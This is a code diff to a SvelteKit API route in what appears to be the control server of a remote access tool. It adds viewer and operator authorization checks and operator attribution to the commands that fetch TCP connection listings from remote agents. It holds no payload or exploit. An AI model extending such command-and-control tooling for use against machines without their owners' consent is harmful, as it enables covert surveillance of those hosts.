@@ -1,6 +1,7 @@
 import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { registry, RegistryError } from '$lib/server/rat/store';
+import { requireOperator, requireViewer } from '$lib/server/authorization';
 import { tcpConnectionsManager, TcpConnectionsError } from '$lib/server/rat/tcp-connections';
 import type {
 	TcpConnectionQuery,
@@ -115,21 +116,25 @@ function normalizeQuery(input: TcpConnectionQuery | undefined): TcpConnectionQue
 	return Object.keys(query).length > 0 ? query : undefined;
 }
 
-export const GET: RequestHandler = ({ params }) => {
+export const GET: RequestHandler = ({ params, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	requireViewer(locals.user);
 
 	const snapshot = tcpConnectionsManager.getSnapshot(id);
 	return json({ snapshot } satisfies TcpConnectionStateResponse);
 };
 
-export const POST: RequestHandler = async ({ params, request }) => {
+export const POST: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let payload: TcpConnectionsActionRequest;
 	try {
@@ -153,7 +158,11 @@ export const POST: RequestHandler = async ({ params, request }) => {
 			requestId,
 			query
 		};
-		registry.queueCommand(id, { name: 'tcp-connections', payload: command });
+		registry.queueCommand(
+			id,
+			{ name: 'tcp-connections', payload: command },
+			{ operatorId: user.id }
+		);
 	} catch (err) {
 		if (err instanceof RegistryError) {
 			tcpConnectionsManager.failPending(
